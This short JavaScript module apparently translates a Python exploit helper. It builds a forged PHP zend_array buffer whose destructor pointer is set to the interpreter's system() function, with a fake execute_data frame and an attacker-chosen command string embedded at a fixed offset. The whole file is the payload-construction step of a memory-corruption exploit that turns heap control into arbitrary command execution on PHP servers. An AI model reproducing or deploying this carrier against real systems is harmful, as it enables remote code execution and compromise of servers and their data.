// Translation of the article-linked pure/mk_ht.py carrier layout.
function buildCarrier(htdata, zif_system, cmd) {
  if (cmd.length > 232) throw new RangeError("command length");
  const zend_array = Buffer.alloc(384);
  const pDestructor = zif_system;
  const execute_data = 0x20;
  zend_array.writeUInt32LE(1, 0);
  zend_array.writeUInt32LE(7, (0) + 4);
  zend_array.writeUInt32LE(16, 8);
  zend_array.writeUInt32LE(4294967288, (8) + 4);
  zend_array.writeBigUInt64LE(htdata + 32n, 16);
  zend_array.writeUInt32LE(1, 24);
  zend_array.writeUInt32LE(1, (24) + 4);
  zend_array.writeUInt32LE(8, 32);
  zend_array.writeUInt32LE(0, (32) + 4);
  zend_array.writeBigUInt64LE(0n, 40);
  zend_array.writeBigUInt64LE(pDestructor, 48);
  zend_array.writeBigUInt64LE(0n, execute_data + 0);
  zend_array.writeBigUInt64LE(0n, execute_data + 8);
  zend_array.writeBigUInt64LE(pDestructor, execute_data + 16);
  zend_array.writeBigUInt64LE(0n, execute_data + 24);
  zend_array.writeBigUInt64LE(0n, execute_data + 32);
  zend_array.writeUInt32LE(0, execute_data + 40);
  zend_array.writeUInt32LE(1, execute_data + 44);
  zend_array.writeBigUInt64LE(0n, execute_data + 48);
  zend_array.writeBigUInt64LE(0n, execute_data + 56);
  zend_array.writeUInt32LE(0, execute_data + 64);
  zend_array.writeBigUInt64LE(htdata + 128n, execute_data + 80);
  zend_array.writeUInt32LE(6, execute_data + 88);
  zend_array.writeUInt32LE(1, 128);
  zend_array.writeUInt32LE(262, (128) + 4);
  zend_array.writeBigUInt64LE(0n, 136);
  zend_array.writeBigUInt64LE(BigInt(cmd.length), 144);
  cmd.copy(zend_array, 0x98);
  zend_array[0x98 + cmd.length] = 0;
  return zend_array;
}
module.exports = { buildCarrier };
